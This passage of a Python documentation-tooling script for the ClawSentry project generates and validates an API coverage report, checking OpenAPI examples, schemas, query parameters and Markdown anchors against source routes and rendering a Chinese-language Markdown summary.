                "GET /report/* is treated as a group alias for concrete report routes, not a runtime route.",
                "Parameter aliases such as {id} are normalized by route-template shape when the method/path is unambiguous.",
                "GET /ui and GET /ui/{path:path} map to excluded dashboard static routes.",
                "Duplicate GET /health is service-disambiguated: API pages default to gateway; webhooks.md maps webhook health.",
            ],
            "matched": docs_mentions["matched"],
            "unmatched": docs_mentions["unmatched"],
        },
        "validation_errors": errors,
        "endpoints": endpoints,
    }


def render_validity_markdown(report: dict[str, Any]) -> str:
    summary = report["summary"]
    status = "通过" if summary["valid"] else "需处理"
    lines = [
        "---",
        "title: API 有效性报告",
        "description: ClawSentry API 文档、源码 route、OpenAPI 与示例的可溯源核验结果",
        "---",
        "",
        "# API 有效性报告",
        "",
        f"生成时间：`{report['generated_at']}`",
        f"核验状态：**{status}**",
        "",
        "本报告从同一份 docs-owned inventory 生成，核对源码 route decorator/registration、Markdown anchor、OpenAPI operation 和端点提及规则。它不修改后端 API 行为，也不会对写入型 API 做盲目 live 调用。",
        "",
        "## 摘要",
        "",
        "| 指标 | 数值 |",
        "| --- | ---: |",
        f"| Coverage entries | {summary['total_coverage_entries']} |",
        f"| OpenAPI operations | {summary['openapi_operations']} |",
        f"| Docs endpoint mentions matched | {summary['docs_endpoint_mentions_matched']} |",
        f"| Docs endpoint mentions unmatched | {summary['docs_endpoint_mentions_unmatched']} |",
        "",
        "## 状态分布",
        "",
        "| 状态 | 数量 |",
        "| --- | ---: |",
    ]
    for key, count in summary["status_counts"].items():
        lines.append(f"| `{key}` | {count} |")
    lines.extend([
        "",
        "## 反向验证规则",
        "",
    ])
    for rule in report["docs_reverse_validation"]["rules"]:
        lines.append(f"- {rule}")
    if report["validation_errors"]:
        lines.extend(["", "## 待处理项", ""])
        for error in report["validation_errors"]:
            lines.append(f"- `{error}`")
    lines.extend([
        "",
        "## 端点核验矩阵",
        "",
        "| Service | Method | Path | Status | Source line | Markdown | OpenAPI | Runtime check |",
        "| --- | --- | --- | --- | --- | --- | --- | --- |",
    ])
    for endpoint in report["endpoints"]:
        markdown = "yes" if endpoint["markdown_anchor_present"] else "no"
        openapi = "yes" if endpoint["openapi_operation_present"] else "no"
        source = endpoint["source_line_current"] if endpoint["source_line_valid"] else f"INVALID {endpoint['source_line_current']}"
        lines.append(
            "| {service} | `{method}` | `{path}` | `{status}` | `{source}` | {markdown} | {openapi} | `{runtime}` |".format(
                service=endpoint["service"],
                method=endpoint["method"],
                path=endpoint["path"],
                status=endpoint["public_status"],
                source=source,
                markdown=markdown,
                openapi=openapi,
                runtime=endpoint["runtime_check_result"],
            )
        )
    lines.extend([
        "",
        "## 复跑命令",
        "",
        "```bash",
        "python scripts/docs_api_inventory.py validate",
        "python scripts/docs_api_inventory.py report --output-dir .omx/reports --docs-output site-docs/api",
        "```",
        "",
        "机器可读副本：[`api-validity.json`](api-validity.json)。",
        "",
    ])
    return "\n".join(lines)


def write_validity_report(output_dir: str | Path, docs_output: str | Path, timestamp: str | None = None) -> tuple[Path, Path, Path, Path, dict[str, Any]]:
    write_coverage()
    write_openapi()
    stamp = timestamp or datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    output_path = _resolve_repo_path(output_dir)
    docs_path = _resolve_repo_path(docs_output)
    output_path.mkdir(parents=True, exist_ok=True)
    docs_path.mkdir(parents=True, exist_ok=True)
    report = build_validity_report()
    json_path = output_path / f"clawsentry-api-validity-{stamp}.json"
    md_path = output_path / f"clawsentry-api-validity-{stamp}.md"
    docs_json_path = docs_path / "api-validity.json"
    docs_md_path = docs_path / "validity-report.md"
    markdown = render_validity_markdown(report)
    for target in [json_path, docs_json_path]:
        target.write_text(json.dumps(report, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
    for target in [md_path, docs_md_path]:
        target.write_text(markdown, encoding="utf-8")
    return json_path, md_path, docs_json_path, docs_md_path, report

def validate() -> list[str]:
    errors: list[str] = []
    coverage = json.loads(COVERAGE_PATH.read_text(encoding="utf-8"))
    by_key = {(e["service"], e["method"], e["path"]): e for e in coverage}
    expected = {(e["service"], e["method"], e["path"]) for e in coverage_entries()}
    actual = set(by_key)
    if expected - actual:
        errors.append(f"coverage missing expected entries: {sorted(expected - actual)}")
    source_routes = extract_source_routes()
    normalized_source = set()
    for service, method, path in source_routes:
        if service == "gateway" and path.startswith("/enterprise/"):
            service = "gateway-enterprise"
        if service == "gateway" and path.startswith("/ui"):
            service = "gateway-ui"
        normalized_source.add((service, method, path))
    if normalized_source - actual:
        errors.append(f"source routes missing from coverage: {sorted(normalized_source - actual)}")
    required = {"service","method","path","source","group","audience","public_status","auth","auth_note","markdown_ref","summary","exclusion_reason"}
    semantic = {"request_example","response_example","errors","openapi_ref"}
    for entry in coverage:
        missing = [field for field in required if field not in entry]
        if missing:
            errors.append(f"{entry.get('service')} {entry.get('method')} {entry.get('path')} missing {missing}")
        if entry.get("public_status") == "excluded":
            if not entry.get("exclusion_reason"):
                errors.append(f"excluded route {entry.get('path')} lacks exclusion_reason")
            continue
        for field in semantic:
            if entry.get(field) in (None, "", []):
                errors.append(f"public route {entry['service']} {entry['method']} {entry['path']} missing {field}")
    openapi = json.loads(OPENAPI_PATH.read_text(encoding="utf-8"))
    if not isinstance(openapi, dict):
        errors.append("openapi artifact is not a JSON object")
    else:
        def _operation(path: str, method: str = "get") -> dict[str, Any]:
            operation = openapi.get("paths", {}).get(path, {}).get(method, {})
            return operation if isinstance(operation, dict) else {}

        def _json_example(path: str) -> dict[str, Any]:
            example = (
                _operation(path)
                .get("responses", {})
                .get("200", {})
                .get("content", {})
                .get("application/json", {})
                .get("example", {})
            )
            return example if isinstance(example, dict) else {}

        risk_example = _json_example("/report/session/{session_id}/risk")
        if "session_risk_ewma" not in risk_example:
            errors.append("openapi risk example missing session_risk_ewma")
        if "critical_event_count" in json.dumps(risk_example.get("window_risk_summary", {}), ensure_ascii=False):
            errors.append("openapi risk window_risk_summary includes stale critical_event_count")

        post_action_example = _json_example("/report/session/{session_id}/post-action")
        for field in ["post_action_score_summary", "decision_path_io"]:
            if field not in post_action_example:
                errors.append(f"openapi post-action example missing {field}")

        sessions_example = _json_example("/report/sessions")
        if "total_active" not in sessions_example or "total" in sessions_example:
            errors.append("openapi sessions example must use total_active and not legacy total")

        def _json_schema(path: str) -> dict[str, Any]:
            schema = (
                _operation(path)
                .get("responses", {})
                .get("200", {})
                .get("content", {})
                .get("application/json", {})
                .get("schema", {})
            )
            return schema if isinstance(schema, dict) else {}

        for path in [
            "/report/sessions",
            "/report/session/{session_id}/risk",
            "/enterprise/report/sessions",
            "/enterprise/report/session/{session_id}/risk",
        ]:
            schema = _json_schema(path)
            if not schema:
                errors.append(f"openapi {path} missing 200 response schema")
                continue
            properties = schema.get("properties", {})
            if path.endswith("/sessions"):
                properties = properties.get("sessions", {}).get("items", {}).get("properties", {})
            ewma_schema = properties.get("session_risk_ewma", {})
            if ewma_schema.get("type") != "number":
                errors.append(f"openapi {path} schema missing numeric session_risk_ewma property")
            if "alpha=0.3" not in ewma_schema.get("description", ""):
                errors.append(f"openapi {path} session_risk_ewma schema missing alpha=0.3 semantics")

        def _query_param_names(path: str) -> set[str]:
            return {
                str(param.get("name"))
                for param in _operation(path).get("parameters", [])
                if isinstance(param, dict) and param.get("in") == "query"
            }

        expected_params = {
            "/report/policy-drift": {"window_seconds", "max_cells"},
            "/report/sessions": {"status", "sort", "limit", "min_risk", "window_seconds"},
            "/report/session/{session_id}/risk": {"limit", "window_seconds"},
            "/report/session/{session_id}/post-action": {"limit", "window_seconds"},
            "/report/stream": {"session_id", "min_risk", "types", "token"},
        }
        for path, names in expected_params.items():
            actual_params = _query_param_names(path)
            if actual_params != names:
                errors.append(f"openapi query params mismatch for {path}: expected {sorted(names)}, got {sorted(actual_params)}")

        if "critical_event_count" in OPENAPI_PATH.read_text(encoding="utf-8"):
            errors.append("openapi artifact contains stale critical_event_count")

    reporting_doc = API_DOCS_DIR / "reporting.md"
    if reporting_doc.exists():
        reporting_source = reporting_doc.read_text(encoding="utf-8")
        if "critical_event_count" in reporting_source:
            errors.append("reporting markdown contains stale critical_event_count")
        if "检测评分（0.0-1.0）" in reporting_source:
            errors.append("reporting markdown documents stale post-action score range 0.0-1.0")
        if "检测评分（0.0-3.0）" not in reporting_source:
            errors.append("reporting markdown missing post-action score range 0.0-3.0")
    for entry in coverage:
        if not _source_line_matches_entry(entry):
            errors.append(f"source line does not point to current route decorator: {entry['service']} {entry['method']} {entry['path']} -> {entry.get('source')}")
        if not _markdown_anchor_present(entry["markdown_ref"]):
            errors.append(f"markdown ref missing: {entry['service']} {entry['method']} {entry['path']} -> {entry['markdown_ref']}")
        if entry.get("public_status") == "excluded":
            continue
        if entry["path"] not in openapi.get("paths", {}) or entry["method"].lower() not in openapi["paths"][entry["path"]]:
            errors.append(f"openapi missing {entry['method']} {entry['path']}")
    docs_mentions = analyze_docs_endpoint_mentions(coverage)
    for mention in docs_mentions["unmatched"]:
        errors.append(f"docs endpoint mention unmatched: {mention['page']}:{mention['line']} {mention['method']} {mention['path']}")
    return errors


def main() -> int:
    parser = argparse.ArgumentParser()
    subparsers = parser.add_subparsers(dest="command", required=True)
    subparsers.add_parser("write")
    subparsers.add_parser("validate")
    subparsers.add_parser("list-routes")
    report_parser = subparsers.add_parser("report")
    report_parser.add_argument("--output-dir", default=".omx/reports")
    report_parser.add_argument("--docs-output", default="site-docs/api")
    report_parser.add_argument("--timestamp", default=None)
    args = parser.parse_args()
    if args.command == "write":
        write_coverage()
        write_openapi()
        return 0
    if args.command == "list-routes":
        print(json.dumps(sorted(extract_source_routes()), ensure_ascii=False, indent=2))
        return 0
    if args.command == "report":
        json_path, md_path, docs_json_path, docs_md_path, report = write_validity_report(
            output_dir=args.output_dir,
            docs_output=args.docs_output,
            timestamp=args.timestamp,
        )
        for path in [json_path, md_path, docs_json_path, docs_md_path]:
            try:
                display_path = path.relative_to(REPO_ROOT).as_posix()
            except ValueError:
                display_path = path.as_posix()
            print(display_path)
        if report["validation_errors"]:
            print("\n".join(report["validation_errors"]))
            return 1
        print("API validity report is valid")
        return 0
    errors = validate()
    if errors:
        print("\n".join(errors))
        return 1
    print("docs API inventory is valid")
    return 0

if __name__ == "__main__":
    raise SystemExit(main())
